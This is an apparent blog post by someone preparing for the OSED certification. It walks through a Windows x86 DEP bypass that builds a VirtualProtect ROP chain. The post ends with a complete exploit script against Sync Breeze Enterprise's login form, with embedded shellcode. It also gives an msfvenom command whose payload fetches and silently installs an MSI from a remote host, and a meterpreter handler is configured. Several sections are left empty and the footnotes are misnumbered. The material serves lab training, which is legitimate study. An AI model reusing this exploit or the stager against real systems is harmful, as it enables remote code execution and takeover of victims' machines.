---
layout: post
slug: passing-osed
title: my experience passing the osed cert
tags: [asm, certs, malware, python]
---

Today I want to share how to create a rop chain leveraging virtualprotect to bypass dep in the context of a buffer overflow exploit in a x86 win [^1]. 

> [!NOTE]  
> As you already know, I'm prepping the [OSED](https://www.offsec.com/courses/exp-301/)[^2]. At the time of writing, I'm a 1337, and this kind of write ups is a way of keeping myself accountable and force to understand everything involved (=[Feyman technique](https://en.wikipedia.org/wiki/Learning_by_teaching)).

> [!NOTE]  
> I assume that if you're reading this, you at least know how to exploit a vanilla buffer overflow, how to use windbg, code in python, and have a decent pain tolerance. 

## wtf is dep?

When exploiting a buffer overflow in windows we might find different kind of protections such as aslr, gc cookies, seh, or dep. In this case we will focus on dep. 

DEP stands for data execution prevention. When we overwrite the memory out of the buffer (buffer overflow), we want to control eip with points to the next section of the memory to be executed. In the vanilla overflow, we do that, overflow it, and find a ret gadget to overwrite the eip. The idea is that it will come back to the same place and execute our shellcode which is inmediately before that. OK, that sounds great.

What happens with DEP is that if we are on the data section, it will NOT run the code! That's a bummer, huh?

## django rop-chained

We will build a rop chain. A rop chain is something we can do to bypass the dep. Basically, since we cannot execute code in the current section, we will call another instructions from available modules that ends with a `ret`. 

Why do they must end with a `ret`? Because we want to return to our exploit after modifying that variable or performing that operation.

So at a super-high-level, we will:
1. overflow the buffer like a boss
2. overwrite the eip with a ret (or p/p/r if seh). so the rest of instructions below will be executed.
3. go to X memory section (allocated in a non-dep module) that will execute Z instruction and ends in `ret`. This is a gadget.
4. after the X ends in `ret`, we got back to our exploit.
5. repeat step 3 and 4 until we make our shellcode executable. 

## the plan

Our plan to bypass it will be the following:
1. find a module without aslr, rebase, and seh.
2. extract all gadgets from that module.
3. filter the required gadgets 
4. locating virtualprotect api.
5. build a rop chain using those gadgets 
6. using virtualprotect, we will grant execution permissions to the section of memory where we allocated our shellcode.
7. fire it to get a nice revshell. 

> [!NOTE]  
> this writeup will be agnostic, it will not focus on any app in particular, it's app agnostic. The core goal is to outline the process and concepts surrounding these kind of exploits. 

### our winapi friends
There are different winapis we can leverage for making our shellcode executable. we will use virtualprotect in this case, BUT could do the same with virtualalloc and writeprocessmemory. 

Oversimplified:
- **virtualprotect**: changing the permissions of an existing code
- **virtualalloc**: allocating new memory with an executable flag.
- **writeprocessmemory**: overwriting new memory with an executable flag.

There are more alternatives that depends on the specific win version and sp. Corelan did the work for us. But these are the three more mainstream ones.

My personal preference? **vp > wpm > va**. But it depends on the specific context, ofc.

### my cuztom helperz

I've created the following helpers to ease things up.

> [!NOTE]  
> I know you don't have the value of POP_EAX and so on. We will review how to get those. But the overall idea stays the same. 

Let's review each.

#### p() for push

[...]

```python
def p(x): return struct.pack("<I", x & 0xFFFFFFFF)
```

#### check if clean register

Returns true or false depending if it contains badchars or not:

```python
def clean(v): return all(b not in BADCHARS for b in p(v))
```

#### convert to u32

[...]

```python
def u32(b): return struct.unpack("<I", b)[0]
```

#### skipping badchars with style

I usually find these instructions by hand but HEY, checking badchars by hand and handling these is not optimal.

`wr()` will be your best friend. it basically load values in an address. What happens is that we might get badchars along the way.

So the trick is to:
1. negate the value
2. instead of fill in edx with our value with pop edx and then our value., we will negate it:
```python
neg = (0x10000000 - 100) & 0xFFFFFFFF
```

And then:
```nasm
pop eax
negative value
negate eax 
mov eax to edx
```

Finally, after filling edx we want to do:
```nasm
pop eax
address we want to write
write it!
padding
```

#### skipping badchars with style (and headaches)

Another alternative is to find a reference without badchars and start increassing or decreassing the value of EAX until we get our target. I'll be honetst: this is messy AF[^4]. We should only strive for this if we cannot put it raw or negated. Good thing is that we would cover 99% of the scenarios.

There are three sub-strategies here:
1. **uniform-byte addends**: the idea is to loop from 1 to 0x100, and doing a multiplitcation (0x01010101 * k). If the address and the value - address are clean, we're good to go.
2. **value with one byte replaced by a clean filler**: we loop byte by byte [...]
3. **palette cross-product** (625 candidates; succeeds in practice with probability ~1 - a random clean A leaves a clean B ~99.6% of the time)

Here's the code with each explained:

```python
def _find_add_split(value):
    """Plan C for double-dirty dwords (dirty raw AND dirty negged: trailing
    zeros, complement-pair bytes). Returns (A, B), dword-clean, A+B==value.
    A loads raw via POP_EAX; B loads via POP_EDX (raw or neg path)."""
    enc = lambda v: clean(v) or clean((-v) & 0xFFFFFFFF)   # EDX-side
    # family 1: uniform-byte addends (0x01010101 * k)
    for k in range(1, 0x100):
        if k in BADCHARS:
            continue
        a = (k * 0x01010101) & 0xFFFFFFFF
        if clean(a) and enc((value - a) & 0xFFFFFFFF):
            return a, (value - a) & 0xFFFFFFFF
    # family 2: value with one byte replaced by a clean filler
    raw = list(p(value))
    for pos in range(4):
        for fill in range(1, 0x100):
            if fill in BADCHARS or fill == raw[pos]:
                continue
            cand = raw.copy(); cand[pos] = fill
            a = u32(bytes(cand))
            if clean(a) and enc((value - a) & 0xFFFFFFFF):
                return a, (value - a) & 0xFFFFFFFF
    # family 3: palette cross-product (625 candidates; succeeds in practice
    # with probability ~1 - a random clean A leaves a clean B ~99.6% of the time)
    pal = [b for b in range(1, 0x100) if b not in BADCHARS][:5]
    for combo in itertools.product(pal, repeat=4):
        a = u32(bytes(combo))
        if enc((value - a) & 0xFFFFFFFF):
            return a, (value - a) & 0xFFFFFFFF
    return None

def load_value(value):
    """ROP bytes leaving `value` in EDX. ALWAYS runs before any pop eax
    (POP_EDX's `sub al,0x5b` eats EAX's low byte).

    Ladder: raw -> neg -> A+B split. Fails LOUDLY, never silently."""
    if clean(value):                                          # rung 1: raw
        return p(POP_EDX) + p(value)
    neg = (-value) & 0xFFFFFFFF
    if clean(neg):                                            # rung 2: neg
        return p(POP_EAX) + p(neg) + p(NEG_EAX) + p(XCHG_EDX)
    split = _find_add_split(value)                            # rung 3: A + B
    if split:
        a, b = split
        if clean(b):
            blk = p(POP_EDX) + p(b)                           # EDX = B (raw)
        else:
            blk = p(POP_EAX) + p((-b) & 0xFFFFFFFF) + p(NEG_EAX) + p(XCHG_EDX)
        blk += p(POP_EAX) + p(a)                              # EAX = A (raw)
        # add eax,edx ; retn 4  ->  XCHG is the popped EIP, J is skipped:
        blk += p(ADD_EDX) + p(XCHG_EDX) + J                  # EDX = A + B = value
        return blk
    raise SystemExit(
        f"[-] cannot encode value {value:#x} (dirty raw, negged, no A+B split)\n"
        "    -> re-roll the payload (new shikata key), or hunt inc/dec gadgets:\n"
        "    ropfilter --safe-enable --arith 'op=inc,dst=eax' --addr-no-bytes <bad> -f <dump>")

def load_addr(addr):
    """ROP bytes leaving `addr` in EAX (neg fallback)."""
    if clean(addr):
        return p(POP_EAX) + p(addr)
    neg = (-addr) & 0xFFFFFFFF
    if not clean(neg):
        raise SystemExit(f"[-] cannot encode address {addr:#x}")
    return p(POP_EAX) + p(neg) + p(NEG_EAX)

def wr(addr, value):
    """[addr] = value - the write-what-where primitive."""
    return load_value(value) + load_addr(addr) + p(WRITE) + J
```

## step 1: finding interesting modules

We will use mona for this, directly from windbg. One first try would be:

```
!py mona modules -cm aslr=false,nx=false,rebase=false
```

We want to filter out modules with no aslr, or rebase, etc. Ofc, this is an oversimplification, because you could bypass those as well, but let's keep it simple and assume you are on your lucky day. If you don't have decent modules like these, you can run `!py mona modules` without the `-cm` flag and review the rest.

> [!NOTE]  
> Why not `narly`? Because it does not have that many options and in my exp sometimes gives false positives.

OK, so this will output something like:

```
 Module info :
----------------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename & Path, DLLCharacteristics
----------------------------------------------------------------------------------------------------------------------------------------------
 0x10000000 | 0x10223000 | 0x00223000 | False  | False   | False | False |  False   | False  | -1.0- [superlib.dll] (C:\Program Files (x86)\OurBinary\bin\superlib.dll) 0x0
...
```

So cool! Let's extract superlib.dll and check if it has the required gadgets we need!

## step 2: pssst, pssst, virtualprotect, where are u?

We need to address virtualprotect. It is in kernel32, which is always loaded. 

We can look for it in our library:

What if it is not loaded? However it might not be always directly referenced. In that case, the trick is to find out that it IS loaded and calculate the difference between both functions. THen we reference the existing function, calc the difference, and that is the address of our function:

Here's how to do it in pseudocode:
```
pop eax
-0x680 & 0xFFFFFFFF
negate eax

pop ecx
anchor - 4
add eax to edx
change the sign of edx

padding

pop eax
target

write eax into edx
padding
```

This is an example in python:

```python
def wr_anchor(target):
    """[target] = [ANCHOR] + DELTA_VP  ->  live VirtualProtect."""
    blk  = p(POP_EAX) + p((-DELTA_VP) & 0xFFFFFFFF)
    blk += p(NEG_EAX)                        # eax = delta
    blk += p(POP_ECX) + p(ANCHOR - 4)        # [ecx+4] = anchor slot
    blk += p(DEREF_ADD)                      # eax = GPH + delta (retn 4)
    blk += p(XCHG_EDX)                       # <- return address (retn 4 pops this)
    blk += J                                 # <- skipped by retn 4's +4
    blk += p(POP_EAX) + p(target)
    return blk + p(WRITE) + J
```

## step 3: extracting gadgets

Now that we have the modules that we like, we can extract potential gadgets using `rp++`:

```powershell
C:\tools\rp-win-x86.exe -f "C:\Program Files (x86)\OurBinary\bin\superlib.dll" -r 8 > \\kali\share\superlib_rop.txt
```

We could do the same with mona straight from windbg like this[^5]:

```
!py mona find -type instr -s "ret" -m "superlib,superlib2" -cpb "\x00\x0a" -x X
```

_Then mona is superior because you avoid dumping stuff?_ Not really. I've seen scenarios where mona didn't got the same results as `rp++` and `ropfilter`. You you must see them as complementary tools, not rivals.

## step 4: filtering gadgets for virtualprotect

OK, now we have a cute `.txt` will all potential gadgets we could use. Now we will use the [ropfilter](https://github.com/MostafaSoliman/ropfilter) utility to find the stuff we want.

But first, lets review the pseudocode of what we need to do:
1. identify where the pointer of VirtualProtect is loaded[^4].
2. identify a writeable code in memory to overwrite.
3. fill in each [VirtualProtect parameters](https://learn.microsoft.com/en-ie/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect):
    a. lpAddress: were our shellcode lives (step 2).
    b. dwSize: the leght of our shellcode. By default we can set it to `0x201`[^6]
    c. flNewProtect: the new protection we will set. we will set it to `0x40`, which stands for `PAGE_EXECUTE_READWRITE`
    d. lpflOldProtect: A pointer to a variable that receives the previous access protection value of the first page in the specified region of pages. We will set it to 0x300.


```python
    # 1) VP frame at F - function pointer born at runtime via anchor+delta
    chain  = wr_anchor(F + 0x00)             # &VirtualProtect (live)
    chain += wr(F + 0x04, SC)                # return address = shellcode
    chain += wr(F + 0x08, SC)                # lpAddress
    chain += wr(F + 0x0C, DW_SIZE)           # dwSize       (neg-encoded)
    chain += wr(F + 0x10, NEW_PROT)          # flNewProtect (neg-encoded)
    chain += wr(F + 0x14, SCRATCH)           # lpflOldProtect -> writable, non-aliasing
```

Awesome, if you're atention span is not yet fried by tiktok, you'd realized that we've referenced constants like `POP_EAX` or `DELTA_VP`.

Here's a table of required variables and how to find them:



## step 5:

## step 6: write tha shellcode

I like to generate a msi stager shellcode using `msfvenom` like this:
```bash
msfvenom -p windows/exec CMD='msiexec /i http://192.168.45.157:4444/X /qn' -f python -v shellcode -a x86
```

> [!NOTE]  
> We did't specify badchars to msfvenom because we build a dynamic encoder helper. BOOM!

However, in this case, we don't just want to blindly add the shellcode to our exploit but to write it in a `data` memory section.
To accomplish this task I've came up with this function:

```python
def push_data(base, data):
    """ROP bytes copying `data` to `base`, one WRITE per dword. This is why
    the shellcode can't just ride the buffer raw: (1) payload badchars are
    handled by load_value's ladder, (2) the destination is a FIXED .data
    address (stack ASLR makes buffer addresses unknowable).

    Dirty write-ADDRESSES (base's low byte cycling into a badchar, e.g.
    0x2b) are detoured via three overlapping clean-address writes; values
    are identical where regions overlap, and iteration skips ahead.

    Precondition: [base, base+len) must be WRITABLE when the chain runs.
    """
    data = data + b"\x90" * (-len(data) % 16)
    out, k = b"", 0
    while k < len(data) // 4:
        a = base + 4 * k
        if clean(a):
            out += wr(a, u32(data[4*k : 4*k + 4]))
            k += 1
        else:
            if k == 0:
                raise SystemExit(f"[-] base {base:#x} itself dirty - shift base")
            for x in (a - 2, a + 2, a + 6):
                if not clean(x):
                    raise SystemExit(f"[-] detour addr {x:#x} dirty - shift base")
            out += wr(a - 2, u32(data[4*k - 2 : 4*k + 2]))
            out += wr(a + 2, u32(data[4*k + 2 : 4*k + 6]))
            out += wr(a + 6, u32(data[4*k + 6 : 4*k + 10]))
            k += 2
    return out
```

Then we will just use it like:
```python
chain += push_data(SC, shellcode)
```


## final code

```python
#!/usr/bin/env python3
"""
Sync Breeze Enterprise - DEP bypass via VirtualProtect [FINAL]
===============================================================
target    : 192.168.168.45:80    (restart the service before every attempt)
delivery  : updog -p 4444 serving X  +  msfconsole handler on 443
            (meterpreter/reverse_tcp, LHOST tun0 = 192.168.45.238)
"""
import itertools
import socket
import struct
import sys

# ---------------------------------------------------------------- target --
RHOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.168.45"
RPORT = 80

# ------------------------------------------------------------ crash geom --
OFFSET = 780             # cyclic pattern + crash, or: !py mona findmsp
SLED_LEN = 17             # r + dd esp L20 after landing ret; tune empirically
BADCHARS = {0x00, 0x0a, 0x0d, 0x25, 0x26, 0x2b, 0x3d}   # badchar-comparison dump

# ------------------------- gadgets (libspp.dll, ASLR off, clean) ----------
# All: ropfilter ... --addr-no-bytes 00,0a,0d,25,26,2b,3d -f libsppr8.txt
RET      = 0x10010122   # ret
#   --ret-only --max-instr 1 --best-last --limit 3
POP_EAX  = 0x1002f729   # pop eax ; ret
#   --safe-enable --pop-map 5/eax
POP_ECX  = 0x1001bc5b   # pop ecx ; ret
#   --safe-enable --pop-map 5/ecx
POP_EDX  = 0x101291b1   # pop edx ; sub al,0x5b ; ret   <- ALWAYS before pop eax
#   --safe-enable --pop-map 5/edx
NEG_EAX  = 0x1005a3e6   # neg eax ; ret
#   --safe-enable --arith 'op=neg,dst=eax' --best-last
XCHG_EDX = 0x100cb4d4   # xchg eax, edx ; ret
#   --safe-enable --reg2reg 'eax->edx' --best-last
WRITE    = 0x1015049f   # mov dword [eax], edx ; pop ebx ; ret
#   --safe-enable --memwrite 'src=edx,base=eax,disp=0' --best-last
PIVOT    = 0x10125d48   # xchg eax, esp ; retn 0
#   --safe-enable --pivot --pivot-kind xchg --pivot-reg eax --best-last
DEREF_ADD= 0x1003f9f6   # mov edx,[ecx+4] ; add eax,edx ; retn 4   (primary, wr_anchor)
#   --safe-enable --arith 'dst=eax,src=edx,op=add' --best-last      (cross-ref BOTH)
#   --safe-enable --memread 'dst=edx,base=ecx,disp=4,op=mov' --best-last
ADD_EDX  = 0x1003f9f9   # add eax, edx ; retn 4                    (encoder rung 3)
#   --safe-enable --arith 'dst=eax,src=edx,op=add' --best-last

# Split fallback if `u 1003f9f6` ever fails verification on a ported target:
# DEREF   = 0x1014dc4c   # mov eax, dword [eax] ; ret
#   --safe-enable --memread 'dst=eax,base=eax,disp=0,op=mov' --best-last

# Optional plan-D rung (NOT verified on this target; visible candidates had
# landmine tails like `or byte [ebx], bh; ret`). Only needed if a future
# target lacks ADD_EAX_EDX but has clean inc/dec:
# INC_EAX = 0x________   # --safe-enable --arith 'op=inc,dst=eax' --best-last
# DEC_EAX = 0x________   # --safe-enable --arith 'op=dec,dst=eax' --best-last

# --------------------- runtime resolution (reboot-proof) ------------------
ANCHOR   = 0x1016803c   # libspp IAT slot: live KERNEL32!GetProcessHeap
#   !dh 10000000                     -> "Import Address Table Directory" RVA+size
#   .logopen c:\iat.txt ; dps 10168000 L60C ; .logclose
#   findstr /i "kernel32" c:\iat.txt (PowerShell; grep if in WSL)
#   verify: dps 0x1016803c L1  -> annotates KERNEL32!GetProcessHeap
DELTA_VP = 0x680        # ? kernel32!VirtualProtect - kernel32!GetProcessHeap
                        #   (build-stable; re-check after any Windows update)
# VP_ADDR = 0x75880c10  # hardcoded variant - report material only, dies per boot

# ------------------------------- memory layout ----------------------------
# F is the ONLY hand-picked address (zero-run in libspp .data). Everything
# else derives from it. Gaps are multiples of 0x100 so SC/SCRATCH inherit
# F's low byte -> the write-address cycle hits only 0x2b (detour-handled).
F              = 0x1020b2f3   # VP frame base   (dd <data>+... L100 -> zero run)
FRAME_SIZE     = 0x18         # 6 dwords: &VP, ret, lpAddress, dwSize, flProt, lpflOldProtect
F_SC_GAP       = 0x200        # frame -> shellcode clearance
SC_SCRATCH_GAP = 0x300        # shellcode -> scratch clearance
DATA_END       = 0x1020C000   # lm m libspp -> module end

SC      = F + F_SC_GAP          # shellcode destination  (= 0x1020b4f3)
SCRATCH = SC + SC_SCRATCH_GAP   # lpflOldProtect OUTPUT  (= 0x1020b7f3)
                                 # MUST be writable AND must not alias the
                                 # shellcode: VP writes 4 bytes here AT RUNTIME
                                 # (aliasing SC = clobbered shellcode AFTER
                                 # the page flip - the nastiest crash to debug)
DW_SIZE  = 0x201               # >= len(shellcode); VP rounds to pages
NEW_PROT = 0x40                # PAGE_EXECUTE_READWRITE (MSDN constants)

J = b"\x41" * 4                # junk dword (pop ebx / retn-4 realignment)

# ------------------------------------------------------- payload (351 B) --
# python3 shellcoder.py --msi -l 192.168.45.238 -s -p 4444 -b 00 0a 0d 25 26 2b 3d
# The tool's badchar warning is IRRELEVANT: bytes are register-built by the
# encoder ladder below - they never appear raw in the buffer.
shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x31\xc0\x50\x66\xb8\x6c\x6c\x50\x68\x72\x74\x2e\x64\x68\x6d\x73\x76\x63\x54\xff\x55\x14\x89\xc3\x68\xa7\xad\x2f\x69\xff\x55\x04\x89\x45\x18\x31\xc0\x50\x66\xb8\x20\x20\x50\x68\x2f\x71\x6e\x20\x68\x34\x2f\x58\x20\x68\x3a\x34\x34\x34\x68\x2e\x32\x33\x38\x68\x38\x2e\x34\x35\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x39\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x54\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"

# ---------------------------------------------------------------- engine --
def p(x):      return struct.pack("<I", x & 0xFFFFFFFF)
def clean(v):  return all(b not in BADCHARS for b in p(v))
def u32(b):    return struct.unpack("<I", b)[0]

def _find_add_split(value):
    """Plan C for double-dirty dwords (dirty raw AND dirty negged: trailing
    zeros, complement-pair bytes). Returns (A, B), dword-clean, A+B==value.
    A loads raw via POP_EAX; B loads via POP_EDX (raw or neg path)."""
    enc = lambda v: clean(v) or clean((-v) & 0xFFFFFFFF)   # EDX-side
    # family 1: uniform-byte addends (0x01010101 * k)
    for k in range(1, 0x100):
        if k in BADCHARS:
            continue
        a = (k * 0x01010101) & 0xFFFFFFFF
        if clean(a) and enc((value - a) & 0xFFFFFFFF):
            return a, (value - a) & 0xFFFFFFFF
    # family 2: value with one byte replaced by a clean filler
    raw = list(p(value))
    for pos in range(4):
        for fill in range(1, 0x100):
            if fill in BADCHARS or fill == raw[pos]:
                continue
            cand = raw.copy(); cand[pos] = fill
            a = u32(bytes(cand))
            if clean(a) and enc((value - a) & 0xFFFFFFFF):
                return a, (value - a) & 0xFFFFFFFF
    # family 3: palette cross-product (625 candidates; succeeds in practice
    # with probability ~1 - a random clean A leaves a clean B ~99.6% of the time)
    pal = [b for b in range(1, 0x100) if b not in BADCHARS][:5]
    for combo in itertools.product(pal, repeat=4):
        a = u32(bytes(combo))
        if enc((value - a) & 0xFFFFFFFF):
            return a, (value - a) & 0xFFFFFFFF
    return None

def load_value(value):
    """ROP bytes leaving `value` in EDX. ALWAYS runs before any pop eax
    (POP_EDX's `sub al,0x5b` eats EAX's low byte).

    Ladder: raw -> neg -> A+B split. Fails LOUDLY, never silently."""
    if clean(value):                                          # rung 1: raw
        return p(POP_EDX) + p(value)
    neg = (-value) & 0xFFFFFFFF
    if clean(neg):                                            # rung 2: neg
        return p(POP_EAX) + p(neg) + p(NEG_EAX) + p(XCHG_EDX)
    split = _find_add_split(value)                            # rung 3: A + B
    if split:
        a, b = split
        if clean(b):
            blk = p(POP_EDX) + p(b)                           # EDX = B (raw)
        else:
            blk = p(POP_EAX) + p((-b) & 0xFFFFFFFF) + p(NEG_EAX) + p(XCHG_EDX)
        blk += p(POP_EAX) + p(a)                              # EAX = A (raw)
        # add eax,edx ; retn 4  ->  XCHG is the popped EIP, J is skipped:
        blk += p(ADD_EDX) + p(XCHG_EDX) + J                  # EDX = A + B = value
        return blk
    raise SystemExit(
        f"[-] cannot encode value {value:#x} (dirty raw, negged, no A+B split)\n"
        "    -> re-roll the payload (new shikata key), or hunt inc/dec gadgets:\n"
        "    ropfilter --safe-enable --arith 'op=inc,dst=eax' --addr-no-bytes <bad> -f <dump>")

def load_addr(addr):
    """ROP bytes leaving `addr` in EAX (neg fallback)."""
    if clean(addr):
        return p(POP_EAX) + p(addr)
    neg = (-addr) & 0xFFFFFFFF
    if not clean(neg):
        raise SystemExit(f"[-] cannot encode address {addr:#x}")
    return p(POP_EAX) + p(neg) + p(NEG_EAX)

def wr(addr, value):
    """[addr] = value - the write-what-where primitive."""
    return load_value(value) + load_addr(addr) + p(WRITE) + J

def wr_anchor(target):
    """[target] = [ANCHOR] + DELTA_VP  ->  live VirtualProtect."""
    blk  = p(POP_EAX) + p((-DELTA_VP) & 0xFFFFFFFF)
    blk += p(NEG_EAX)                        # eax = delta
    blk += p(POP_ECX) + p(ANCHOR - 4)        # [ecx+4] = anchor slot
    blk += p(DEREF_ADD)                      # eax = GPH + delta (retn 4)
    blk += p(XCHG_EDX)                       # <- return address (retn 4 pops this)
    blk += J                                 # <- skipped by retn 4's +4
    blk += p(POP_EAX) + p(target)
    return blk + p(WRITE) + J

def push_data(base, data):
    """ROP bytes copying `data` to `base`, one WRITE per dword. This is why
    the shellcode can't just ride the buffer raw: (1) payload badchars are
    handled by load_value's ladder, (2) the destination is a FIXED .data
    address (stack ASLR makes buffer addresses unknowable).

    Dirty write-ADDRESSES (base's low byte cycling into a badchar, e.g.
    0x2b) are detoured via three overlapping clean-address writes; values
    are identical where regions overlap, and iteration skips ahead.

    Precondition: [base, base+len) must be WRITABLE when the chain runs.
    """
    data = data + b"\x90" * (-len(data) % 16)
    out, k = b"", 0
    while k < len(data) // 4:
        a = base + 4 * k
        if clean(a):
            out += wr(a, u32(data[4*k : 4*k + 4]))
            k += 1
        else:
            if k == 0:
                raise SystemExit(f"[-] base {base:#x} itself dirty - shift base")
            for x in (a - 2, a + 2, a + 6):
                if not clean(x):
                    raise SystemExit(f"[-] detour addr {x:#x} dirty - shift base")
            out += wr(a - 2, u32(data[4*k - 2 : 4*k + 2]))
            out += wr(a + 2, u32(data[4*k + 2 : 4*k + 6]))
            out += wr(a + 6, u32(data[4*k + 6 : 4*k + 10]))
            k += 2
    return out

# ------------------------------------------------------------------ chain --
def build_chain():
    sc = shellcode + b"\x90" * (-len(shellcode) % 16)

    # ---- self-audit: alignment, overlaps, capacity (all named bounds) ----
    if F % 4 or F_SC_GAP % 0x100 or SC_SCRATCH_GAP % 0x100:
        raise SystemExit("[-] misaligned F or gaps (low-byte rule violated)")
    zones = [("F", F, F + FRAME_SIZE),
             ("SHELLCODE", SC, SC + len(sc)),
             ("SCRATCH", SCRATCH, SCRATCH + 4)]
    zones.sort(key=lambda z: z[1])
    for (n1, s1, e1), (n2, s2, e2) in zip(zones, zones[1:]):
        if e1 > s2:
            raise SystemExit(f"[-] {n1} overflows into {n2}: {e1:#x} > {s2:#x}")
    if SCRATCH + 4 > DATA_END:
        raise SystemExit(f"[-] layout overruns .data end {DATA_END:#x}")

    # 1) VP frame at F - function pointer born at runtime via anchor+delta
    chain  = wr_anchor(F + 0x00)             # &VirtualProtect (live)
    chain += wr(F + 0x04, SC)                # return address = shellcode
    chain += wr(F + 0x08, SC)                # lpAddress
    chain += wr(F + 0x0C, DW_SIZE)           # dwSize       (neg-encoded)
    chain += wr(F + 0x10, NEW_PROT)          # flNewProtect (neg-encoded)
    chain += wr(F + 0x14, SCRATCH)           # lpflOldProtect -> writable, non-aliasing

    # 2) stage the shellcode at SC (encoder ladder + address detours inside)
    chain += push_data(SC, shellcode)

    # 3) pivot: ESP = F -> ret -> VirtualProtect -> returns into SC (now RWX)
    chain += p(POP_EAX) + p(F) + p(PIVOT)
    return chain

# ----------------------------------------------------------------- buffer --
def build_buffer():
    chain = build_chain()
    buf   = b"A" * OFFSET + p(RET) * SLED_LEN + chain
    hits  = [(i, hex(b)) for i, b in enumerate(buf) if b in BADCHARS]
    if hits:
        raise SystemExit(f"[-] BAD CHARS at {hits[:5]}")
    print(f"[+] chain {len(chain)}B | buffer {len(buf)}B")
    print(f"[+] VP resolved at runtime: [{ANCHOR:#x}] + {DELTA_VP:#x}")
    print(f"[+] F={F:#x} SC={SC:#x} SCRATCH={SCRATCH:#x}")
    return buf

def send(buf):
    content = b"username=" + buf + b"&password=A"
    req  = b"POST /login HTTP/1.1\r\n"
    req += b"Host: " + RHOST.encode() + b"\r\n"
    req += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/52.0\r\n"
    req += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += b"Accept-Language: en-US,en;q=0.5\r\n"
    req += b"Referer: http://" + RHOST.encode() + b"\r\n"
    req += b"Connection: close\r\n"
    req += b"Content-Type: application/x-www-form-urlencoded\r\n"
    req += b"Content-Length: " + str(len(content)).encode() + b"\r\n\r\n"
    req += content
    s = socket.create_connection((RHOST, RPORT)); s.send(req); s.close()
    print("[*] sent - check your listener")

if __name__ == "__main__":
    if not shellcode:
        raise SystemExit("[-] shellcode is empty")
    # PRE-FLIGHT (once per target/boot, in WinDbg - attached to the LIVE pid!):
    #   ? kernel32!VirtualProtect - kernel32!GetProcessHeap   -> 0x680
    #   u 1003f9f6 L4 ; u 1015049f L3 ; u 101291b1 L3 ; u 10125d48 L2
    # DEBUG CHECKPOINTS:
    #   bp 1003f9f6  -> step over: EAX = live VirtualProtect (0x75880c10-class)
    #   bp 10125d48  -> dd F L6: <live VP> SC SC 201 40 SCRATCH
    #   bp SC        -> !address SC = PAGE_EXECUTE_READWRITE  <- the trophy shot
    send(build_buffer())
```

## step 7: test it


## bottom line







[^1]: a lot of fancy words right out of the bat. I bet this is not ideal for reader retention. shout out to the 3% of you that will keep scrolling!
[^2]: I'm aware some the processes described here are aligned with OSED course work and not optimal. Bear with me!
[^4]: my friend GLM helped me to takle this. 
[^4]: -cbp is for badchars, and -x X is to just show gadgets from executable sections.
[^5]: or in worst-case scenario, calc where it's address as we learnt in [step 2](#step-2-pssst-pssst-virtualprotect-where-are-u)
[^6]: not 0x200 to avoid null chars (`00`)